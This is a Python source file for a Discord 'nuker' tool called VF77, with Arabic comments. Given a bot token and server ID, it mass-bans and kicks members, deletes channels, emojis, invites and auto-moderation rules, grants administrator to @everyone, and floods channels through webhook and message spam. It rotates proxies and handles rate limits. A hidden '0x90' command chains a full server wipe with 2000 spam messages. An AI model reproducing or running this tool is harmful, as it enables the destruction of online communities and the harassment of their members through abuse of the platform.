import os
import sys
import time
import random
import asyncio
import aiohttp
from itertools import cycle
from colorama import Fore, init
from datetime import datetime
from asyncio import Semaphore

# محاولة استيراد دعم SOCKS5
try:
    from aiohttp_socks import ProxyConnector
    SOCKS_SUPPORT = True
except ImportError:
    SOCKS_SUPPORT = False

init(autoreset=True)

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

# ================== تصميم VF77 الجديد ==================
c1 = "\x1b[38;5;17m"
c2 = "\x1b[38;5;18m"
c3 = "\x1b[38;5;19m"
c4 = "\x1b[38;5;20m"
c5 = "\x1b[38;5;21m"
cr = "\x1b[0m"

x444_art = f"""
{c1}                                  __     _______ _____ _____ 
{c2}                                  \ \   / /  ___|___  |___  |
{c3}                                   \ \ / /| |_     / /   / / 
{c4}                                    \ V / |  _|   / /   / /  
{c5}                                     \_/  |_|    /_/   /_/

{cr}                               Made By : Russianharvey & Somr
{c5}                              ═══════════════════════════════════         
{cr}"""


options = f"""
{c4}              ╚╦╗                                                             ╔╦╝
{c5}         ╔═════╩══════════════════════════╦══════════════════════════╩═════╗
{c5}         ╩ {c1}[01]{c5} Ban All Members          ║ {c1}[11]{c5} Rename All Channels      ╩
{c5}           {c1}[02]{c5} Kick All Members         ║ {c1}[12]{c5} Give Admin to @everyone    
{c5}           {c1}[03]{c5} Unban Everyone           ║ {c1}[13]{c5} Rename All Members        
{c5}           {c1}[04]{c5} Create Text Channels     ║ {c1}[14]{c5} Delete All Emojis         
{c5}           {c1}[05]{c5} Create Voice Channels    ║ {c1}[15]{c5} Delete All Stickers       
{c5}           {c1}[06]{c5} Create Categories        ║ {c1}[16]{c5} Delete Vanity URL         
{c5}           {c1}[07]{c5} Delete All Channels      ║ {c1}[17]{c5} Webhook Spammer           
{c5}           {c1}[08]{c5} Create New Roles         ║ {c1}[18]{c5} Change Server Name        
{c5}           {c1}[09]{c5} Server Information       ║ {c1}[19]{c5} Delete All Invites        
{c5}           {c1}[10]{c5} Mass Ping                ║ {c1}[20]{c5} Pause All Invites         
{c5}         ╦ {c1}[21]{c5} Disable Auto-Mod         ║ {c1}[22]{c5} Disable Community         ╦
{c5}         ╦ {c1}[23]{c5} Enable Community         ║ {c1}[0]{c5}  Shutdown System           ╦
{c5}         ╚═════╦══════════════════════════╩══════════════════════════╦═════╝
{c4}              ╔╩╝                                                             ╚╩╗
{cr}"""

# ================== Rate Limiter ==================
class RateLimiter:
    def __init__(self):
        self.limits = {}
        self.global_limit = None

    def update(self, key, headers):
        if 'X-RateLimit-Remaining' in headers:
            rem = int(headers['X-RateLimit-Remaining'])
            reset = float(headers.get('X-RateLimit-Reset-After', 1))
            self.limits[key] = (rem, time.time() + reset)
        if 'X-RateLimit-Global' in headers:
            retry = float(headers.get('Retry-After', 1))
            self.global_limit = time.time() + retry

    async def wait(self, key):
        if self.global_limit and time.time() < self.global_limit:
            await asyncio.sleep(self.global_limit - time.time())
        if key in self.limits:
            rem, reset = self.limits[key]
            if rem <= 0 and time.time() < reset:
                await asyncio.sleep(reset - time.time())

# ================== Proxy Rotator (اختياري) ==================
class ProxyRotator:
    def __init__(self, proxy_file="proxies.txt"):
        self.proxies = []
        self.current = 0
        self.failed = set()
        self.load(proxy_file)
        if self.proxies:
            print(f"{Fore.GREEN}[✓] Loaded {len(self.proxies)} proxies")

    def load(self, proxy_file):
        if os.path.exists(proxy_file):
            with open(proxy_file) as f:
                self.proxies = [line.strip() for line in f if line.strip()]

    def get(self):
        if not self.proxies:
            return None
        available = [p for p in self.proxies if p not in self.failed]
        if not available:
            self.failed.clear()
            available = self.proxies
        proxy = available[self.current % len(available)]
        self.current += 1
        return proxy

    def mark_failed(self, proxy):
        if proxy:
            self.failed.add(proxy)

    def connector(self):
        proxy = self.get()
        if not proxy:
            return aiohttp.TCPConnector(limit=0, limit_per_host=30)
        if SOCKS_SUPPORT and proxy.startswith(('socks4://', 'socks5://')):
            try:
                return ProxyConnector.from_url(proxy)
            except:
                pass
        return aiohttp.TCPConnector(limit=0, limit_per_host=30)

# ================== العميل الأساسي ==================
class VF77HTTP:
    def __init__(self, token, guild_id, use_proxy=False):
        self.token = token
        self.guild_id = guild_id
        self.base = "https://discord.com/api/v10"
        self.headers = {
            "Authorization": f"Bot {token}",
            "Content-Type": "application/json"
        }
        self.proxy_rotator = ProxyRotator() if use_proxy else None
        self.rate_limiter = RateLimiter()
        self.print_queue = asyncio.Queue()
        self.bot_id = None
        self._create_session()

    def _create_session(self):
        timeout = aiohttp.ClientTimeout(total=20)
        if self.proxy_rotator:
            conn = self.proxy_rotator.connector()
        else:
            conn = aiohttp.TCPConnector(limit=0, limit_per_host=30)
        self.session = aiohttp.ClientSession(headers=self.headers, connector=conn, timeout=timeout)

    async def close(self):
        await self.session.close()

    async def _request(self, method, endpoint, json=None, retries=5):
        url = f"{self.base}/{endpoint}"
        key = endpoint.split('?')[0]
        for attempt in range(retries):
            await self.rate_limiter.wait(key)
            try:
                async with self.session.request(method, url, json=json) as resp:
                    self.rate_limiter.update(key, resp.headers)
                    if resp.status in (200, 201, 204):
                        return await resp.json() if resp.status != 204 else {}
                    if resp.status == 429:
                        data = await resp.json()
                        await asyncio.sleep(data.get('retry_after', 1))
                        continue
                    return None
            except (aiohttp.ClientError, asyncio.TimeoutError):
                if attempt == retries - 1:
                    return None
                await asyncio.sleep(0.5 * (2 ** attempt))
            except Exception:
                return None
        return None

    async def get_bot_id(self):
        if not self.bot_id:
            data = await self._request("GET", "users/@me")
            self.bot_id = data['id'] if data else None
        return self.bot_id

    async def get_guild_channels(self):
        return await self._request("GET", f"guilds/{self.guild_id}/channels") or []

    async def get_guild_members(self):
        members, after = [], 0
        while True:
            data = await self._request("GET", f"guilds/{self.guild_id}/members?limit=1000&after={after}")
            if not data:
                break
            members.extend(data)
            if len(data) < 1000:
                break
            after = data[-1]['user']['id']
        return members

    async def get_guild_roles(self):
        return await self._request("GET", f"guilds/{self.guild_id}/roles") or []

    async def get_bans(self):
        bans, after = [], None
        while True:
            url = f"guilds/{self.guild_id}/bans?limit=1000"
            if after:
                url += f"&after={after}"
            data = await self._request("GET", url)
            if not data:
                break
            bans.extend(data)
            if len(data) < 1000:
                break
            after = data[-1]['user']['id']
        return bans

    async def get_emojis(self):
        return await self._request("GET", f"guilds/{self.guild_id}/emojis") or []

    async def get_stickers(self):
        return await self._request("GET", f"guilds/{self.guild_id}/stickers") or []

    async def get_invites(self):
        return await self._request("GET", f"guilds/{self.guild_id}/invites") or []

    async def get_auto_mod_rules(self):
        return await self._request("GET", f"guilds/{self.guild_id}/auto-moderation/rules") or []

    # -------------------- الإجراءات --------------------
    async def ban_user(self, user_id, days=0):
        return await self._request("PUT", f"guilds/{self.guild_id}/bans/{user_id}", json={"delete_message_days": days})

    async def kick_user(self, user_id):
        return await self._request("DELETE", f"guilds/{self.guild_id}/members/{user_id}")

    async def unban_user(self, user_id):
        return await self._request("DELETE", f"guilds/{self.guild_id}/bans/{user_id}")

    async def create_channel(self, name, typ):
        return await self._request("POST", f"guilds/{self.guild_id}/channels", json={"name": name, "type": typ})

    async def delete_channel(self, cid):
        return await self._request("DELETE", f"channels/{cid}")

    async def create_role(self, name, color=None):
        color = color or random.randint(0, 0xFFFFFF)
        return await self._request("POST", f"guilds/{self.guild_id}/roles", json={"name": name, "color": color})

    async def delete_role(self, rid):
        return await self._request("DELETE", f"guilds/{self.guild_id}/roles/{rid}")

    async def send_message(self, cid, content):
        return await self._request("POST", f"channels/{cid}/messages", json={"content": content})

    async def create_dm(self, uid):
        return await self._request("POST", "users/@me/channels", json={"recipient_id": uid})

    async def rename_channel(self, cid, new):
        return await self._request("PATCH", f"channels/{cid}", json={"name": new})

    async def modify_role_perms(self, rid, perms):
        return await self._request("PATCH", f"guilds/{self.guild_id}/roles/{rid}", json={"permissions": str(perms)})

    async def modify_member_nick(self, uid, nick):
        return await self._request("PATCH", f"guilds/{self.guild_id}/members/{uid}", json={"nick": nick})

    async def delete_emoji(self, eid):
        return await self._request("DELETE", f"guilds/{self.guild_id}/emojis/{eid}")

    async def delete_sticker(self, sid):
        return await self._request("DELETE", f"guilds/{self.guild_id}/stickers/{sid}")

    async def delete_vanity(self):
        return await self._request("PATCH", f"guilds/{self.guild_id}/vanity-url", json={"code": None})

    async def create_webhook(self, cid, name):
        return await self._request("POST", f"channels/{cid}/webhooks", json={"name": name})

    async def execute_webhook(self, wid, token, content):
        url = f"https://discord.com/api/webhooks/{wid}/{token}"
        try:
            async with self.session.post(url, json={"content": content}, timeout=5) as r:
                return r.status in (200, 201, 204)
        except:
            return False

    async def send_messages_to_webhook(self, wid, token, content, count, max_concurrent=20):
        sem = Semaphore(max_concurrent)
        async def one():
            async with sem:
                return await self.execute_webhook(wid, token, content)
        tasks = [one() for _ in range(count)]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        return sum(1 for r in results if r is True)

    async def modify_guild(self, **kwargs):
        return await self._request("PATCH", f"guilds/{self.guild_id}", json=kwargs)

    async def delete_invite(self, code):
        return await self._request("DELETE", f"invites/{code}")

    async def delete_auto_mod_rule(self, rid):
        return await self._request("DELETE", f"guilds/{self.guild_id}/auto-moderation/rules/{rid}")

    # -------------------- استخراج المعلومات للطباعة --------------------
    def _extract_info(self, data, default):
        if data and isinstance(data, dict):
            name = data.get('name') or data.get('code') or data.get('username') or data.get('global_name') or ''
            id_ = data.get('id') or ''
            if name or id_:
                return name, id_
        if isinstance(default, dict):
            if 'user' in default:
                u = default['user']
                return u.get('username', ''), u.get('id', '')
            return default.get('name', ''), default.get('id', '')
        return str(default), ''

    async def printer(self):
        while True:
            entry = await self.print_queue.get()
            if entry is None:
                break
            t, desc, name, id_, ok = entry
            color = Fore.GREEN if ok else Fore.RED
            print(f"{Fore.RED}[{Fore.WHITE}{t}{Fore.RED}] {color}[INFO] {desc} {name} | {id_}")
            self.print_queue.task_done()

    async def parallel_execute(self, items, func, desc="Processed", maxc=200):
        sem = Semaphore(maxc)
        async def worker(i):
            async with sem:
                return await self._exec_one(i, func, desc)
        await asyncio.gather(*[worker(i) for i in items])

    async def _exec_one(self, item, func, desc):
        try:
            res = await func(item)
            if res:
                n, i = self._extract_info(res, item)
                await self.print_queue.put((datetime.now().strftime("%Y-%m-%d %H:%M:%S"), desc, n, i, True))
            else:
                n, i = self._extract_info(None, item)
                await self.print_queue.put((datetime.now().strftime("%Y-%m-%d %H:%M:%S"), f"Failed {desc}", n, i, False))
        except Exception as e:
            n, i = self._extract_info(None, item)
            await self.print_queue.put((datetime.now().strftime("%Y-%m-%d %H:%M:%S"), f"Error {desc}", n, str(e), False))

# ================== القائمة الرئيسية ==================
async def main_menu(client):
    printer = asyncio.create_task(client.printer())
    bot_id = await client.get_bot_id()

    while True:
        clear()
        print(x444_art)
        print(options)
        print()
        ans = input(f"{c5}VF77@ROOT:~$ {cr}").strip()
        if ans == '0':
            await client.print_queue.put(None)
            await printer
            await client.close()
            sys.exit(0)

        # تحويل الإدخال إلى رقم (قد يكون 01 أو 1)
        try:
            cmd = int(ans)
        except:
            cmd = -1

        if cmd == 1:
            members = await client.get_guild_members()
            members = [m for m in members if m['user']['id'] != bot_id]
            if not members:
                print(f"{Fore.RED}[!] No members to ban.")
                await asyncio.sleep(2)
                continue
            await client.parallel_execute(members, lambda m: client.ban_user(m['user']['id']), "Banned user", 300)
        elif cmd == 2:
            members = await client.get_guild_members()
            members = [m for m in members if m['user']['id'] != bot_id]
            await client.parallel_execute(members, lambda m: client.kick_user(m['user']['id']), "Kicked user", 300)
        elif cmd == 3:
            bans = await client.get_bans()
            if not bans:
                print(f"{Fore.RED}[!] No bans found.")
                await asyncio.sleep(2)
                continue
            uids = [b['user']['id'] for b in bans]
            await client.parallel_execute(uids, client.unban_user, "Unbanned user", 300)
        elif cmd == 4:
            name = input("Channel name: ")
            amt = int(input("Amount: ") or 50)
            await client.parallel_execute(range(amt), lambda _: client.create_channel(name, 0), "Created channel", 150)
        elif cmd == 5:
            name = input("Channel name: ")
            amt = int(input("Amount: ") or 50)
            await client.parallel_execute(range(amt), lambda _: client.create_channel(name, 2), "Created voice", 150)
        elif cmd == 6:
            name = input("Category name: ")
            amt = int(input("Amount: ") or 50)
            await client.parallel_execute(range(amt), lambda _: client.create_channel(name, 4), "Created category", 150)
        elif cmd == 7:
            channels = await client.get_guild_channels()
            await client.parallel_execute(channels, lambda c: client.delete_channel(c['id']), "Deleted channel", 150)
        elif cmd == 8:
            name = input("Role name: ")
            amt = int(input("Amount: ") or 50)
            await client.parallel_execute(range(amt), lambda _: client.create_role(name), "Created role", 150)
        elif cmd == 9:
            guild = await client._request("GET", f"guilds/{client.guild_id}")
            if guild:
                created = guild.get('created_at', 'N/A')
                if created != 'N/A':
                    try:
                        created = datetime.fromisoformat(created.replace('Z', '+00:00')).strftime("%Y-%m-%d %H:%M:%S")
                    except:
                        pass
                owner = guild.get('owner_id', 'N/A')
                oname = "Unknown"
                if owner != 'N/A':
                    odata = await client._request("GET", f"users/{owner}")
                    if odata:
                        oname = odata.get('username', 'Unknown')
                info = f"""
{c5}  ┌──{Fore.WHITE}(VF77@INFO{Fore.RED})──[{Fore.WHITE}~/Server{Fore.RED}]
{c5}  ├─╼ {Fore.RED}Name    : {Fore.WHITE}{guild.get('name','N/A')}
{c5}  ├─╼ {Fore.RED}ID      : {Fore.WHITE}{guild.get('id','N/A')}
{c5}  ├─╼ {Fore.RED}Owner   : {Fore.WHITE}{oname} | {owner}
{c5}  ├─╼ {Fore.RED}Created : {Fore.WHITE}{created}
{c5}  ├─╼ {Fore.RED}Members : {Fore.WHITE}{guild.get('approximate_member_count','N/A')}
{c5}  ├─╼ {Fore.RED}Channels: {Fore.WHITE}{len(await client.get_guild_channels())}
{c5}  └─╼ {Fore.YELLOW}Press Enter...
"""
                print(info)
                input()
        elif cmd == 10:
            msg = input("Message: ")
            amt = int(input("Total messages: ") or 100)
            channels = await client.get_guild_channels()
            text = [c['id'] for c in channels if c['type'] == 0]
            if not text:
                print("No text channels!")
                await asyncio.sleep(1)
                continue
            cycle_chan = cycle(text)
            await client.parallel_execute(range(amt), lambda _: client.send_message(next(cycle_chan), msg), "Sent message", 300)
        elif cmd == 11:
            name = input("New channel name: ")
            channels = await client.get_guild_channels()
            await client.parallel_execute(channels, lambda c: client.rename_channel(c['id'], name), "Renamed channel", 300)
        elif cmd == 12:
            roles = await client.get_guild_roles()
            if roles:
                r = await client.modify_role_perms(roles[0]['id'], "8")
                if r:
                    await client.print_queue.put((datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "Granted admin", "@everyone", roles[0]['id'], True))
                else:
                    await client.print_queue.put((datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "Failed admin", "@everyone", roles[0]['id'], False))
        elif cmd == 13:
            nick = input("New nickname: ")
            members = await client.get_guild_members()
            members = [m for m in members if m['user']['id'] != bot_id]
            await client.parallel_execute(members, lambda m: client.modify_member_nick(m['user']['id'], nick), "Renamed user", 300)
        elif cmd == 14:
            emojis = await client.get_emojis()
            await client.parallel_execute(emojis, lambda e: client.delete_emoji(e['id']), "Deleted emoji", 150)
        elif cmd == 15:
            stickers = await client.get_stickers()
            await client.parallel_execute(stickers, lambda s: client.delete_sticker(s['id']), "Deleted sticker", 150)
        elif cmd == 16:
            r = await client.delete_vanity()
            if r:
                await client.print_queue.put((datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "Deleted vanity", "vanity", client.guild_id, True))
            else:
                await client.print_queue.put((datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "Failed vanity", "vanity", client.guild_id, False))
        elif cmd == 17:
            msg = input("Spam message: ")
            cnt = int(input("Messages per webhook: ") or 50)
            channels = await client.get_guild_channels()
            text = [c['id'] for c in channels if c['type'] == 0]
            if not text:
                print("No text channels!")
                await asyncio.sleep(1)
                continue
            print(f"{Fore.YELLOW}[*] Creating webhooks...")
            webhooks = []
            async def create_wh(cid):
                w = await client.create_webhook(cid, "VF77")
                if w:
                    webhooks.append(w)
                return w
            await client.parallel_execute(text, create_wh, "Created webhook", 50)
            if not webhooks:
                print(f"{Fore.RED}[!] No webhooks created.")
                await asyncio.sleep(1)
                continue
            print(f"{Fore.YELLOW}[*] Spamming {cnt} messages to {len(webhooks)} webhooks...")
            async def spam_wh(w):
                succ = await client.send_messages_to_webhook(w['id'], w['token'], msg, cnt, 20)
                if succ:
                    await client.print_queue.put((datetime.now().strftime("%Y-%m-%d %H:%M:%S"), f"Spammed {succ}/{cnt}", w.get('name',''), w['id'], True))
                else:
                    await client.print_queue.put((datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "Failed spam", w.get('name',''), w['id'], False))
            await client.parallel_execute(webhooks, spam_wh, "Processing", 5)
        elif cmd == 18:
            new = input("New server name: ").strip()
            if not new:
                print(f"{Fore.RED}[!] Empty name.")
                await asyncio.sleep(1)
                continue
            r = await client.modify_guild(name=new)
            if r:
                await client.print_queue.put((datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "Changed name", new, client.guild_id, True))
            else:
                await client.print_queue.put((datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "Failed name", new, client.guild_id, False))
        elif cmd == 19:
            invites = await client.get_invites()
            if invites:
                await client.parallel_execute(invites, lambda i: client.delete_invite(i['code']), "Deleted invite", 150)
            else:
                print(f"{Fore.YELLOW}[!] No invites found.")
                await asyncio.sleep(1)
        elif cmd == 20:
            r = await client.modify_guild(features=["INVITES_DISABLED"])
            if r:
                await client.print_queue.put((datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "Paused invites", "server", client.guild_id, True))
            else:
                await client.print_queue.put((datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "Failed invites", "server", client.guild_id, False))
        elif cmd == 21:
            rules = await client.get_auto_mod_rules()
            if rules:
                await client.parallel_execute(rules, lambda r: client.delete_auto_mod_rule(r['id']), "Deleted auto-mod", 150)
            else:
                print(f"{Fore.YELLOW}[!] No auto-mod rules.")
                await asyncio.sleep(1)
        elif cmd == 22:
            r = await client.modify_guild(features=[])
            if r:
                await client.print_queue.put((datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "Disabled community", "server", client.guild_id, True))
            else:
                await client.print_queue.put((datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "Failed community", "server", client.guild_id, False))
        elif cmd == 23:
            r = await client.modify_guild(features=["COMMUNITY"])
            if r:
                await client.print_queue.put((datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "Enabled community", "server", client.guild_id, True))
            else:
                await client.print_queue.put((datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "Failed community", "server", client.guild_id, False))
        elif ans == '0x90':
            n_name = input("Channels name: ")
            n_msg = input("Spam message: ")
            print(f"{Fore.YELLOW}[1/4] Banning all...")
            members = await client.get_guild_members()
            members = [m for m in members if m['user']['id'] != bot_id]
            await client.parallel_execute(members, lambda m: client.ban_user(m['user']['id']), "Banned user", 300)
            print(f"{Fore.YELLOW}[2/4] Deleting channels...")
            channels = await client.get_guild_channels()
            await client.parallel_execute(channels, lambda c: client.delete_channel(c['id']), "Deleted channel", 150)
            print(f"{Fore.YELLOW}[3/4] Creating 200 channels...")
            await client.parallel_execute(range(200), lambda _: client.create_channel(n_name, 0), "Created channel", 150)
            print(f"{Fore.YELLOW}[4/4] Spamming 2000 messages...")
            new_chan = await client.get_guild_channels()
            text = [c['id'] for c in new_chan if c['type'] == 0]
            if text:
                cc = cycle(text)
                await client.parallel_execute(range(2000), lambda _: client.send_message(next(cc), n_msg), "Sent message", 800)
        else:
            print(f"{Fore.RED}[!] Invalid command.")
            await asyncio.sleep(1)

        await asyncio.sleep(0.05)

# ================== نقطة الدخول ==================
async def main():
    clear()
    os.system("title VF77 Nuker")
    print(x444_art)
    use_proxy = input(f"{c5}Use proxies? (y/n) [n]: {cr}").strip().lower() == 'y'
    token = input(f"{c5}Bot Token: {cr}").strip()
    os.system("cls")
    print(x444_art)
    guild_id = input(f"{c5}Guild ID: {cr}").strip()
    client = VF77HTTP(token, guild_id, use_proxy)
    try:
        await main_menu(client)
    finally:
        await client.close()

if __name__ == "__main__":
    asyncio.run(main())